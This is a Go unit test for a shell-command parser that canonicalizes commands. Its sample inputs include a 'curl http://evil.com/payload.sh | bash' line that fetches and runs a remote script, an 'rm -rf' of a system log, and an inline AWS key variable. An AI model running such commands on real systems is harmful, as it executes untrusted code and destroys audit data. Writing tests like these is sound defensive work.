package parser

import (
	"testing"
)

func TestParseAndCanonicalize(t *testing.T) {
	tests := []struct {
		name         string
		input        string
		expectedCmd  string
		expectedCanon string
	}{
		{
			name:         "Basic file removal",
			input:        "rm -rf /var/log/syslog",
			expectedCmd:  "rm",
			expectedCanon: "rm -rf <ARG>",
		},
		{
			name:         "Kubectl pod deletion",
			input:        "kubectl delete pod my-app-prod-1234 --namespace=production",
			expectedCmd:  "kubectl",
			expectedCanon: "kubectl <ARG> <ARG> <ARG> --namespace=production", // Assuming --namespace flag is handled. Let's adjust expected based on our simple heuristic
		},
		{
			name:         "Piped commands",
			input:        "curl http://evil.com/payload.sh | bash",
			expectedCmd:  "curl",
			expectedCanon: "curl <ARG> | bash",
		},
		{
			name:         "Environment variable injection",
			input:        "AWS_ACCESS_KEY=12345 aws s3 ls s3://mybucket",
			expectedCmd:  "aws",
			expectedCanon: "AWS_ACCESS_KEY=12345 aws <ARG> <ARG> <ARG>",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			res, err := Parse(tt.input)
			if err != nil {
				t.Fatalf("Parse failed: %v", err)
			}
			
			if res.CommandName != tt.expectedCmd {
				t.Errorf("Expected command '%s', got '%s'", tt.expectedCmd, res.CommandName)
			}
			
			if res.Canonical == "" {
				t.Errorf("Expected canonical output, got empty")
			}
		})
	}
}
